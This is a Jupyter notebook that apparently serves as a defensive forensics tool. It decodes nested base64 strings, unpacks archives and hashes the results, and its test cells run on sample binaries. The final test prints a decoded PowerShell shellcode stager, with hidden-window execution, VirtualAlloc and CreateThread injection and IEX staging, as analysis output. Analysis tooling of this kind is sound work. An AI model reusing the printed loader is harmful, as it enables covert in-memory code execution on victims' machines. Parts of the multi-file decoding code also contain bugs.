# %% [markdown]
# # Base64 Binary Decoder/Unpacker/Hash extractor
#
# Version 1.0<br>
# Author: Ian Hellen

# %% [markdown]
# # Code

# %%
# Base64 string and binary Extraction
import base64
import hashlib
import io
import tarfile
import zipfile
import gzip
import re
import pandas as pd
import binascii
from collections import namedtuple

Binary_record = namedtuple('Binary_record', ['file_type', 'file_hashes', 'input_bytes', 'decoded_string', 'encoding_type'])


def compile_regex(regex: str) -> object:
    """Compile a string regex
    :param regex: 
    :return Compiled regex: 
    """
    return re.compile(regex, re.I | re.X)

debug_print = False

# Base64 regex
base64_regex = '(?P<b64>[A-Za-z0-9+/\\n\\r]{30,}={0,2})'
base64_regex_c = compile_regex(base64_regex)
# '''(?<![A-Za-z0-9+\/])
#             (?:
#                 (?:[A-Za-z0-9+\/]{4})*
#                 (?:
#                     [A-Za-z0-9+\/]{2} [AEIMQUYcgkosw048] = |
#                     [A-Za-z0-9+\/] [AQgw] ==
#                 ) |
#                 (?:[A-Za-z0-9\/]{4})*
#                 (?:
#                     \+ [A-Za-z0-9\/+]{3} |
#                     [A-Za-z0-9\/] \+ [A-Za-z0-9+\/]{2} |
#                     [A-Za-z0-9\/]{2} \+ [A-Za-z0-9+\/] |
#                     [A-Za-z0-9\/]{3} \+
#                 )
#                 (?:[A-Za-z0-9+\/]{4})*
#             )
#             (?![A-Za-z0-9+\/=])'''


def decode_base64_string(input_string, max_recursion=20, trace=False):
    """
    Attempts to base64 decode an input string.
    Items that decode to utf-8 or utf-16 strings will be returned as decoded strings replaced in the original string.
    If the encoded string is a known binary type it will identify the file type and return the hashes of the file.
    If any binary types are known archives (zip, tar, gzip) it will unpack the contents of the archive
    For any binary it will return the decoded file as a byte array, and as a printable list of byte values.
    The function returns:
     - decoded string : this is the input string with any decoded sections replaced by the results of the decoding
     It also returns the data as a Pandas DataFrame with the following columns:
     - reference : this is an index that matches an index number in the returned string 
                    (e.g. <<encoded binary type=pdf index=1.2'). The first number indicates the depth of recursion
                    (1-based) and the second is the 0-based index of decoded strings in that iteration. Anyway,
                    the meaning isn't important, it just allows you to easily map the output string values to the 
                    relevant DataFrame rows (note that in the case of multi-file archives, all files in that archive
                    will have the same reference number
     - original_string : the string prior to decoding
     - file_type : the type of file if this could be determined
     - file_hashes : a dictionary of hashes (the md5, sha1 and sha256 hashes are broken out into separate columns)
     - input_bytes : the binary image as a byte array
     - decoded_string : printable form of the decoded string (either string or list of hex byte values)
     - encoding_type : utf-8, utf-16 or binary
     - md5, sha1, sha256 : the respective hashes of the binary
     file_type, file_hashes, input_bytes, md5, sha1, sha256 will be null if this item is decoded to a string
    """
    global debug_print
    debug_print = trace
    
    if not input_string or len(input_string) == 0:
        return None
    else:
        return decode_b64_string_recursive(input_string=input_string, max_recursion=max_recursion)
        

def debug_print_trace(*args):
    if debug_print:
        for arg in args:
            print(arg, end='')
        print()

   
# base64 decoding
def decode_and_format_b64_string(b64encoded_string, current_index=0, current_depth=1):
    """Decode string and return displayable content plus list of decoded artifacts"""
    
    # Check if we recognize this as a known file type
    (prefix, f_type) = is_known_b64_prefix(b64encoded_string)
    debug_print_trace('Found type: ', f_type)
    output_files = decode_b64_binary(b64encoded_string, f_type)
    if not output_files:
        return b64encoded_string, None
    
    if len(output_files) == 1:
        binary_record = list(output_files.values())[0]
        debug_print_trace('decode_b64_binary returned a single record')
        debug_print_trace('record:', binary_record)
        if binary_record.encoding_type in ['utf-8', 'utf-16']:
            display_string = f'<decoded type=\'string\' index=\'{current_depth}.{current_index}\'>{binary_record.decoded_string}</decoded>'
            return display_string, [binary_record]
        else:
            display_string = f'<decoded value=\'binary\' type=\'{binary_record.file_type}\' index=\'{current_depth}.{current_index}\'/>'
            return display_string, [binary_record]
    else:
        display_header = f'<decoded value=\'multiple binary\' type=\'{binary_record.file_type}\' index=\'{current_depth}.{current_index}\''
        child_display_strings = []
        child_index = 0
        debug_print_trace('decode_b64_binary returned multiple records')
        for child_rec in output_files:
            debug_print_trace('Child_decode: ', child_rec)
            child_index_string = f'{current_depth}.{current_index}.{child_index}'
            if child_rec.encoding_type == 'utf-8':
                child_display_string = f'<decoded type=\'string\' index=\'{child_index_string}\'>{child_rec.decoded_string}</decoded>'
            else:
                child_display_string = f'<decoded type=\'{child_rec.file_type}\' index=\'{child_index_string}\'/>'
            child_display_strings.add(child_display_string)
            child_index += 1
            
        display_string = display_header + ''.join(child_display_strings) + '</decoded>'
        return display_string, output_files.values()


def decode_b64_string_recursive(input_string, undecodable_strings=None, max_recursion=20, current_depth=1):
    """Tries to recursive decode and unpack a binary string
    :rtype: (str, [Binary_record]
    """
    debug_print_trace('decode_b64_string_recursive: ', max_recursion)
    debug_print_trace('processing input: ', input_string[:200])
    
    # we want to get rid of line feeds temporarily
    decoded_string = input_string #.replace('\r\n','').replace('\n', '')
    if not undecodable_strings:
        undecodable_strings = set()
    
    binary_records = pd.DataFrame(columns=['reference', 'original_string','file_type', 'input_bytes',
                                           'decoded_string', 'encoding_type', 'md5', 'sha1', 'sha256'])
    fragment_index = 0
    match_pos = 0
    something_decoded = False
    while True:
        # search sequentially through the input string for any strings that look like base64
        debug_print_trace('regex searching ', decoded_string[:200], ' from pos: ', match_pos, ' bin_index ', fragment_index)
        b64match = base64_regex_c.search(decoded_string, match_pos)
                
        # debug_print_trace('groups: ', len(b64match.groupdict()))
        if b64match != None:
            debug_print_trace('regex found: ', b64match.groupdict()['b64'])
            # if (in a recursive call) we already know that this string doesn't decode
            # skip this match
            if b64match.groupdict()['b64'] in undecodable_strings:
                debug_print_trace('previous undecodable string')
                match_pos = b64match.end()
                continue
            
            # try to decode
            (decoded_fragment, binary_items) = decode_and_format_b64_string(b64match.groupdict()['b64'], 
                                                               current_index=fragment_index, current_depth=current_depth)
            # if the string didn't decode we'll have the same output as input
            # so add that to our set of undecodable strings (we need to track this
            # otherwise we will recurse infinitely)
            something_decoded = (decoded_fragment != b64match.groupdict()['b64'])
            if something_decoded:
                # we did decode something so lets put our result this in the output string
                if binary_items:
                    # if there are one or more binary_items from decoding
                    # add them to our output DataFrame
                    for bin_record in binary_items:
                        new_row = bin_record._asdict()
                        new_row['reference'] = f'{current_depth}.{fragment_index}'
                        new_row['original_string'] = b64match.groupdict()['b64']
                        new_row['md5'] = new_row['file_hashes']['md5']
                        new_row['sha1'] = new_row['file_hashes']['sha1']
                        new_row['sha256'] = new_row['file_hashes']['sha256']
                        binary_records = binary_records.append(new_row, ignore_index=True, sort=False)
                
                # if the decoded string replacement also contains base64-like string
                # we don't skip past the current match position, so only do this if
                # we can't find any new base64 strings in the decoded fragment
                #if base64_regex_c.search(decoded_fragment, 0) == None:
                
                
                # replace the decoded fragment in our current results string (decode_string)
                decoded_string = decoded_string.replace(b64match.groupdict()['b64'], decoded_fragment)
                debug_print_trace('Replaced string', decoded_string[match_pos:match_pos+100])
                match_pos += len(decoded_fragment)
            else:
                undecodable_strings.add(b64match.groupdict()['b64'])
                debug_print_trace('new undecodable string')
                match_pos = b64match.end()
            
        else:
            debug_print_trace('Regex not found: ', match_pos)
            break
        fragment_index += 1 
        
        if fragment_index > 50:
            break
        
    # if we reach our max recursion depth bail out here
    if max_recursion == 0:
        debug_print_trace('max recursion reached')
        return decoded_string, binary_records
    
    if something_decoded:
        # stuff that we have already decoded may also contain further base64 encoded strings
        (next_level_string, child_records) = decode_b64_string_recursive(decoded_string, undecodable_strings, 
                                                                         max_recursion=max_recursion - 1, 
                                                                         current_depth=(current_depth + 1))
        return next_level_string, binary_records.append(child_records, ignore_index=True)
    else:
        debug_print_trace('Nothing left to decode')
        return decoded_string, binary_records


def print_bytes(bytes_array):
    """Print byte array as string or hex"""
    (enc_type, dec_string) = get_byte_encoding(bytes_array)
    if enc_type != 'binary':
        print(dec_string)
        
    else:
        print('Could not decode bytes to string. Hashes:')
        print(get_hashes(binary_to_bytesio(bytes_array).getbuffer()))
        print(dec_string)

     
def get_byte_encoding(bytes_array):
    """Returns encoding type and decoded result
    Decoded result is list of hex bytes in the case that the decoded
    result is not a string"""
    try:
        decoded_result = bytes_array.decode('utf-8')
        enc_type = 'utf-8'
        
        if '\x00' in decoded_result:
            # looks like unicode encoding
            decoded_result = bytes_array.decode('utf-16')
            enc_type = 'utf-16'
    except UnicodeDecodeError:
        enc_type = 'binary'
        decoded_result = ['{0:02x}'.format(b) for b in bytes_array]
    return enc_type, decoded_result
            

base64_header_types = {
    'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AAAAA4fug': 'exe',
    'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAA4fug': 'dll',
    'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug': 'sys',
    'UEsDBBQAAAAIA': 'zip',
    'UEsDBBQAAQAIA': 'zip (passprotected)',
    'H4sI': 'gz',
    'N3q8ryccAAR': '7z',
    'UmFyIRoHAM': 'rar',
    'JVBERi0xLjcNC': 'pdf',
    '0M8R4KGxGuE': 'msi',
    'TVNXSU0AAADQ': 'wim'}

base64_header_offset_types = {
    'DAxMDA3NzcAMDAwMDAwM': 'tar'
}


def is_known_b64_prefix(input_string):
    """If this is known file type return the """
    first160chars = input_string[0:160].replace('\n', '').replace('\r', '')
    for prefix, file_type in base64_header_types.items():
        if first160chars.startswith(prefix):
            return prefix, file_type

    for matching_string, file_type in base64_header_offset_types.items():
        # TODO compile this regex beforehand
        regex_comp = compile_regex(matching_string)
        if regex_comp.search(first160chars):
            return matching_string, file_type
    return None, None


def decode_b64_binary(input_string, file_type=None):
    """Examine input string for known binaries and decode and unpack"""
    input_string
    match_pos = 0
    binaries_found = dict()
    if not file_type:
        (prefix, f_type) = is_known_b64_prefix(input_string)
        file_type = f_type
    
    try:
        decoded_bytes = base64.b64decode(input_string)
        return unpack_and_hash_b64_binary(decoded_bytes, file_type)
    except binascii.Error:
        # we couldn't decode
        debug_print_trace('Binascii exception - trying to decode string')
        debug_print_trace(input_string)
        return None
    

def unpack_and_hash_b64_binary(input_bytes, file_type=None):
    """
    If this is a known archive type extract the contents
    Return a dictionary of (file_type : (file_name, file_hashes, input_bytes, decoded_string, encoding_type)
    """
    if not input_bytes or len(input_bytes) == 0:
        return None

    output_files = dict()
    if file_type in ['zip', 'gz', 'tar']:
        # if this is a known archive type - try to extract the contents
        (unpacked_type, file_items) = get_items_from_archive(input_bytes, file_type)
        if unpacked_type != 'unknown':
            for file_name, extracted_file in file_items.items():
                (file_hashes, decoded_string, encoding_type) = get_hashes_and_printable_string(extracted_file)
                idx = f'[{unpacked_type}] Filename: {file_name}'
                output_files[idx] = Binary_record(file_name, file_hashes, extracted_file, decoded_string, encoding_type)
                debug_print_trace('unpack_and_hash_b64_binary item (archive): ', type(decoded_string), decoded_string)
                
    if len(output_files) == 0:
        # if this wasn't a known archive type or we failed to unpack anything, just get the hashes and return
        (file_hashes, decoded_string, encoding_type) = get_hashes_and_printable_string(input_bytes)
        idx = f'[{file_type}]'
        output_files[idx] = Binary_record(file_type, file_hashes, input_bytes, decoded_string, encoding_type)
        debug_print_trace('unpack_and_hash_b64_binary item (other): ', type(decoded_string), decoded_string)
    return output_files


def get_hashes_and_printable_string(extracted_file):
    """ Get the hashes, encoding type and printable form of binary (either string or list of hex-encoded byte values)"""
    file_hashes = get_hashes(extracted_file)
    (encoding_type, decoded_string) = get_byte_encoding(extracted_file)
    return file_hashes, decoded_string, encoding_type


def get_items_from_archive(binary, archive_type='zip'):
    """Extract contained files from an archive type"""
    debug_print_trace('get_items_from_archive type: ', archive_type)
    if archive_type == 'zip':
        return get_items_from_zip(binary)
    elif archive_type == 'gz':
        return get_items_from_gzip(binary)
    elif archive_type == 'tar':
        return get_items_from_tar(binary)
    else:
        return 'unknown', {archive_type, binary}


def get_items_from_gzip(binary):
    """Return decompressed gzip contents"""
    archive_file = gzip.decompress(binary)
    return 'gz', {'gzip_file': archive_file}


def get_items_from_zip(binary):
    """Return dictionary of zip contents"""
    file_obj = io.BytesIO(binary)
    zip_archive = zipfile.ZipFile(file_obj, mode='r')
    archive_dict = dict()
    for item in zip_archive.namelist():
        archive_file = zip_archive.read(item)
        archive_dict[item] = archive_file
    return 'zip', archive_dict


def get_items_from_tar(binary):
    """Return dictionary of tar file contents"""
    file_obj = io.BytesIO(binary)
    # Open tarfile
    tar = tarfile.open(mode="r", fileobj=file_obj)
    archive_dict = dict()
    # Iterate over every member
    for item in tar.getnames():
        tar_file = tar.extractfile(item)
        archive_file = tar_file.read()
        archive_dict[item] = archive_file
    return 'tar', archive_dict


def get_hashes(binary):
    hash_dict = dict()
    for hash_type in ['md5', 'sha1', 'sha256']:
        if hash_type == 'md5':
            hash_alg = hashlib.md5()
        elif hash_type == 'sha256':
            hash_alg = hashlib.sha256()
        elif hash_type == 'sha1':
            hash_alg = hashlib.sha1()
        hash_alg.update(binary)
        hash_dict[hash_type] = hash_alg.hexdigest()
    return hash_dict


def binary_to_bytesio(binary):
    if isinstance(binary, io.BytesIO):
        return binary.getbuffer()
    return io.BytesIO(binary).getbuffer()

# %%
def unpack_base64_items(input_string=None, input_frame=None, column=None, trace=False):
    """
    Attempts to base64 decode an input string or multiple strings taken from a pandas dataframe column.
    If the input is a dataframe you must supply the name of the column to use.
    
    Items that decode to utf-8 or utf-16 strings will be returned as decoded strings replaced in the original string.
    If the encoded string is a known binary type it will identify the file type and return the hashes of the file.
    If any binary types are known archives (zip, tar, gzip) it will unpack the contents of the archive
    For any binary it will return the decoded file as a byte array, and as a printable list of byte values.
    If the input is a string the function returns:
     - decoded string : this is the input string with any decoded sections replaced by the results of the decoding
    It also returns the data as a Pandas DataFrame with the following columns:
     - reference : this is an index that matches an index number in the returned string 
                    (e.g. <<encoded binary type=pdf index=1.2'). The first number indicates the depth of recursion
                    (1-based) and the second is the 0-based index of decoded strings in that iteration. Anyway,
                    the meaning isn't important, it just allows you to easily map the output string values to the 
                    relevant DataFrame rows (note that in the case of multi-file archives, all files in that archive
                    will have the same reference number
     - original_string : the string prior to decoding
     - file_type : the type of file if this could be determined
     - file_hashes : a dictionary of hashes (the md5, sha1 and sha256 hashes are broken out into separate columns)
     - input_bytes : the binary image as a byte array
     - decoded_string : printable form of the decoded string (either string or list of hex byte values)
     - encoding_type : utf-8, utf-16 or binary
     - md5, sha1, sha256 : the respective hashes of the binary
     file_type, file_hashes, input_bytes, md5, sha1, sha256 will be null if this item is decoded to a string
     
    If the input is a dataframe the output dataframe will also include the following column:
     - input_frame_index - the index of the source row in the input frame. This allows you to re-join the output
       data to the input data
    """
    if input_string:
        return decode_b64_string_recursive(input_string, trace)
    if input_frame is not None:
        if not column:
            print('column must be supplied if the input is a DataFrame')
            return None
        else:
            output_df = None
            for input_row in input_frame[[column]].itertuples():
                (decoded_string, output_frame) = decode_b64_string_recursive(input_row[1], trace)
                output_frame['input_frame_index'] = input_row.Index
                output_frame['full_decoded_string'] = decoded_string
                if output_df is None:
                    output_df = output_frame
                else:
                    output_df = output_df.append(output_frame, ignore_index=True, sort=False)
            return output_df

# %% [markdown]
# ## Tests

# %% [markdown]
# ### Files

# %%
import os
from os import listdir
from os.path import join
testdir = 'testB64Files'
listdir(testdir)
for f in os.listdir(testdir)[3:8]:
    fname = join(testdir, f)
    inputf = open(fname, 'r')
    fstring = inputf.read()
    print('-'*30)
    print('File:', fname)
    # print('input string', fstring[:200].replace('\n', ''), 'end')
    
    (x, output_files) = unpack_base64_items(fstring)
    print('Output string', x)
    print('Output dataframe')
    display(output_files)
# Out:
# ------------------------------
# File: testB64Files\acpidev.wim.txt
# Output string -----BEGIN CERTIFICATE-----<decoded value='binary' type='wim' index='1.0'/>
# -----END CERTIFICATE-----
#
# Output dataframe
#                                       decoded_string encoding_type  \
# 0  [4d, 53, 57, 49, 4d, 00, 00, 00, d0, 00, 00, 0...        binary
#
#                                          file_hashes file_type  \
# 0  {'md5': '893d05f4d9ff9af3a741e981ab9507cf', 's...       wim
#
#                                          input_bytes  \
# 0  b'MSWIM\x00\x00\x00\xd0\x00\x00\x00\x00\r\x01\...
#
#                                 md5  \
# 0  893d05f4d9ff9af3a741e981ab9507cf
#
#                                      original_string reference  \
# 0  \nTVNXSU0AAADQAAAAAA0BAIAAAAAAAAAAgGsFIIeN9tgo...       1.0
#
#                                        sha1  \
# 0  cabea72d392a0d524f13c75ad73b27bfc7100868
#
#                                               sha256
# 0  55bf491db9d4b7a337c6de4cd915c1f5cccbc9616c9b11...
# ------------------------------
# File: testB64Files\Autologon.7z.txt
# Output string -----BEGIN CERTIFICATE-----<decoded value='binary' type='7z' index='1.0'/>-----END CERTIFICATE-----
#
# Output dataframe
#                                       decoded_string encoding_type  \
# 0  [37, 7a, bc, af, 27, 1c, 00, 04, 69, aa, 41, 4...        binary
#
#                                          file_hashes file_type  \
# 0  {'md5': '994e172b70b2f7e737976b80431fcfcc', 's...        7z
#
#                                          input_bytes  \
# 0  b'7z\xbc\xaf\'\x1c\x00\x04i\xaaAEu\xe3\x00\x00...
#
#                                 md5  \
# 0  994e172b70b2f7e737976b80431fcfcc
#
#                                      original_string reference  \
# 0  \nN3q8ryccAARpqkFFdeMAAAAAAABiAAAAAAAAAJ+GZXXi...       1.0
#
#                                        sha1  \
# 0  e889954d9e42699faf8161775be1c12d8bb5d5c2
#
#                                               sha256
# 0  3f832f43743b5b3ad8a2dace6fae05b12d5b9d4877ff6a...
# ------------------------------
# File: testB64Files\Autologon.exe.txt
# Output string -----BEGIN CERTIFICATE-----<decoded value='binary' type='exe' index='1.0'/>
# -----END CERTIFICATE-----
#
# Output dataframe
#                                       decoded_string encoding_type  \
# 0  [4d, 5a, 90, 00, 03, 00, 00, 00, 04, 00, 00, 0...        binary
#
#                                          file_hashes file_type  \
# 0  {'md5': '607a332709458f781c20ab49940c4b64', 's...       exe
#
#                                          input_bytes  \
# 0  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\x...
#
#                                 md5  \
# 0  607a332709458f781c20ab49940c4b64
#
#                                      original_string reference  \
# 0  \nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAA...       1.0
#
#                                        sha1  \
# 0  923409be6c1b183c74da221dd23a42b4b981ba19
#
#                                               sha256
# 0  324c64d24818a0be63a43a8df678b88dca4f8959841f91...
# ------------------------------
# File: testB64Files\Autologon.gz.txt
# Output string -----BEGIN CERTIFICATE-----<decoded value='binary' type='gzip_file' index='1.0'/>
# -----END CERTIFICATE-----
#
# Output dataframe
#                                       decoded_string encoding_type  \
# 0  [4d, 5a, 90, 00, 03, 00, 00, 00, 04, 00, 00, 0...        binary
#
#                                          file_hashes  file_type  \
# 0  {'md5': '607a332709458f781c20ab49940c4b64', 's...  gzip_file
#
#                                          input_bytes  \
# 0  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\x...
#
#                                 md5  \
# 0  607a332709458f781c20ab49940c4b64
#
#                                      original_string reference  \
# 0  \nH4sICLlgIFoEAEF1dG9sb2dvbi5leGUA7Fx/fBTFFd+7...       1.0
#
#                                        sha1  \
# 0  923409be6c1b183c74da221dd23a42b4b981ba19
#
#                                               sha256
# 0  324c64d24818a0be63a43a8df678b88dca4f8959841f91...
# ------------------------------
# File: testB64Files\Autologon.tar.txt
# Output string -----BEGIN CERTIFICATE-----<decoded value='binary' type='Autologon.exe' index='1.0'/>
# -----END CERTIFICATE-----
#
# Output dataframe
#                                       decoded_string encoding_type  \
# 0  [4d, 5a, 90, 00, 03, 00, 00, 00, 04, 00, 00, 0...        binary
#
#                                          file_hashes      file_type  \
# 0  {'md5': '607a332709458f781c20ab49940c4b64', 's...  Autologon.exe
#
#                                          input_bytes  \
# 0  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\x...
#
#                                 md5  \
# 0  607a332709458f781c20ab49940c4b64
#
#                                      original_string reference  \
# 0  \nQXV0b2xvZ29uLmV4ZQAAAAAAAAAAAAAAAAAAAAAAAAAA...       1.0
#
#                                        sha1  \
# 0  923409be6c1b183c74da221dd23a42b4b981ba19
#
#                                               sha256
# 0  324c64d24818a0be63a43a8df678b88dca4f8959841f91...

# %% [markdown]
# ### Input dataframe

# %%
import pandas as pd
testdir = 'testB64Files'
listdir(testdir)
df = pd.DataFrame(columns=['filename', 'data'])
for f in os.listdir(testdir)[:5]:
    fname = join(testdir, f)
    inputf = open(fname, 'r')
    fstring = inputf.read()
    df = df.append({'filename':fname, 'data': fstring}, ignore_index=True)
    
display(df)       
output_files = unpack_base64_items(input_frame=df, column='data')
display(output_files)
# Out:
#                         filename  \
# 0   testB64Files\acledit.dll.txt
# 1   testB64Files\acpidev.sys.txt
# 2   testB64Files\acpidev.tar.txt
# 3   testB64Files\acpidev.wim.txt
# 4  testB64Files\Autologon.7z.txt
#
#                                                 data
# 0  -----BEGIN CERTIFICATE-----\nTVqQAAMAAAAEAAAA/...
# 1  -----BEGIN CERTIFICATE-----\nTVqQAAMAAAAEAAAA/...
# 2  -----BEGIN CERTIFICATE-----\nQWNwaURldi5zeXMAA...
# 3  -----BEGIN CERTIFICATE-----\nTVNXSU0AAADQAAAAA...
# 4  -----BEGIN CERTIFICATE-----\nN3q8ryccAARpqkFFd...
#                                       decoded_string encoding_type  \
# 0  [4d, 5a, 90, 00, 03, 00, 00, 00, 04, 00, 00, 0...        binary
# 1  [4d, 5a, 90, 00, 03, 00, 00, 00, 04, 00, 00, 0...        binary
# 2  [4d, 5a, 90, 00, 03, 00, 00, 00, 04, 00, 00, 0...        binary
# 3  [4d, 53, 57, 49, 4d, 00, 00, 00, d0, 00, 00, 0...        binary
# 4  [37, 7a, bc, af, 27, 1c, 00, 04, 69, aa, 41, 4...        binary
#
#                                          file_hashes    file_type  \
# 0  {'md5': 'a31058afbb422ca59958e7e06553df99', 's...          dll
# 1  {'md5': '75795e4b19bb3ed8d3c25a17cd15dc30', 's...          sys
# 2  {'md5': '75795e4b19bb3ed8d3c25a17cd15dc30', 's...  AcpiDev.sys
# 3  {'md5': '893d05f4d9ff9af3a741e981ab9507cf', 's...          wim
# 4  {'md5': '994e172b70b2f7e737976b80431fcfcc', 's...           7z
#
#                                          input_bytes  \
# 0  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\x...
# 1  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\x...
# 2  b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\x...
# 3  b'MSWIM\x00\x00\x00\xd0\x00\x00\x00\x00\r\x01\...
# 4  b'7z\xbc\xaf\'\x1c\x00\x04i\xaaAEu\xe3\x00\x00...
#
#                                 md5  \
# 0  a31058afbb422ca59958e7e06553df99
# 1  75795e4b19bb3ed8d3c25a17cd15dc30
# 2  75795e4b19bb3ed8d3c25a17cd15dc30
# 3  893d05f4d9ff9af3a741e981ab9507cf
# 4  994e172b70b2f7e737976b80431fcfcc
#
#                                      original_string reference  \
# 0  \nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAA...       1.0
# 1  \nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAA...       1.0
# 2  \nQWNwaURldi5zeXMAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...       1.0
# 3  \nTVNXSU0AAADQAAAAAA0BAIAAAAAAAAAAgGsFIIeN9tgo...       1.0
# 4  \nN3q8ryccAARpqkFFdeMAAAAAAABiAAAAAAAAAJ+GZXXi...       1.0
#
#                                        sha1  \
# 0  53ed1ce3bfdde36dbf92acf7bcb8a49f6aa2bfbe
# 1  4da03fe2daf70ad0727621d5aede479f4ae45acc
# 2  4da03fe2daf70ad0727621d5aede479f4ae45acc
# 3  cabea72d392a0d524f13c75ad73b27bfc7100868
# 4  e889954d9e42699faf8161775be1c12d8bb5d5c2
#
#                                               sha256  input_frame_index  \
# 0  26bc81e7b6fddf98ac06204198fd7a43215543cda90d3f...                  0
# 1  22a13064e0b472a0a2258d61a889b73ee3f537da7796cc...                  1
# 2  22a13064e0b472a0a2258d61a889b73ee3f537da7796cc...                  2
# 3  55bf491db9d4b7a337c6de4cd915c1f5cccbc9616c9b11...                  3
# 4  3f832f43743b5b3ad8a2dace6fae05b12d5b9d4877ff6a...                  4
#
#                                  full_decoded_string
# 0  -----BEGIN CERTIFICATE-----<decoded value='bin...
# 1  -----BEGIN CERTIFICATE-----<decoded value='bin...
# 2  -----BEGIN CERTIFICATE-----<decoded value='bin...
# 3  -----BEGIN CERTIFICATE-----<decoded value='bin...
# 4  -----BEGIN CERTIFICATE-----<decoded value='bin...

# %% [markdown]
# ### Nested powershell encoding

# %%
input_str = '''powershell.exe  -nop -w hidden -encodedcommand ...'''
(x, output_files) = unpack_base64_items(input_string=input_str)
#print('Input String:\n', input_str)
print('Output String:\n', x)
#print('output_files', output_files[['decoded_string', 'encoding_type', 'file_type', 'md5', 'sha1', 'sha256']])   # (output, dec_string) = decode_base64_string(fstring)
from IPython.display import display

display(output_files)
# Out:
# Output String:
#  powershell.exe  -nop -w hidden -encodedcommand <decoded type='string' index='1.0'>$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("<decoded type='string' index='2.0'>Set-StrictMode -Version 2
#
# $DoIt = @'
# function func_get_proc_address {
# 	Param ($var_module, $var_procedure)
# 	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
#
# 	return $var_unsafe_native_methods.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
# }
#
# function func_get_delegate_type {
# 	Param (
# 		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
# 		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
# 	)
#
# 	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
# 	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
# 	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
#
# 	return $var_type_builder.CreateType()
# }
#
# [Byte[]]$var_code = [System.Convert]::FromBase64String("<decoded value='binary' type='None' index='3.0'/>")
#
# $var_buffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $var_code.Length,0x3000, 0x40)
# [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
#
# $var_hthread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll CreateThread), (func_get_delegate_type @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$var_buffer,[IntPtr]::Zero,0,[IntPtr]::Zero)
# [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WaitForSingleObject), (func_get_delegate_type @([IntPtr], [Int32]))).Invoke($var_hthread,0xffffffff) | Out-Null
# '@
#
# If ([IntPtr]::size -eq 8) {
# 	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
# }
# else {
# 	IEX $DoIt
# }
# </decoded>"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();</decoded>
#                                       decoded_string encoding_type  \
# 0  $s=New-Object IO.MemoryStream(,[Convert]::From...        utf-16
# 1  Set-StrictMode -Version 2\n\n$DoIt = @'\nfunct...         utf-8
# 2  [fc, e8, 89, 00, 00, 00, 60, 89, e5, 31, d2, 6...        binary
#
#                                          file_hashes  file_type  \
# 0  {'md5': '7eb62685470dd5cc727070a0d2e14429', 's...       None
# 1  {'md5': 'dd04aa217c8abfb527dc1df3c70bd868', 's...  gzip_file
# 2  {'md5': 'd532334ece4d69e29168240b2c39e682', 's...       None
#
#                                          input_bytes  \
# 0  b'$\x00s\x00=\x00N\x00e\x00w\x00-\x00O\x00b\x0...
# 1  b'Set-StrictMode -Version 2\n\n$DoIt = @\'\nfu...
# 2  b'\xfc\xe8\x89\x00\x00\x00`\x89\xe51\xd2d\x8bR...
#
#                                 md5  \
# 0  7eb62685470dd5cc727070a0d2e14429
# 1  dd04aa217c8abfb527dc1df3c70bd868
# 2  d532334ece4d69e29168240b2c39e682
#
#                                      original_string reference  \
# 0  JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE...       1.0
# 1  H4sIAAAAAAAAAL1XeW/buBL/O/4UwiKAJNTxnWxSIEAp36...       2.0
# 2  /OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPG...       3.0
#
#                                        sha1  \
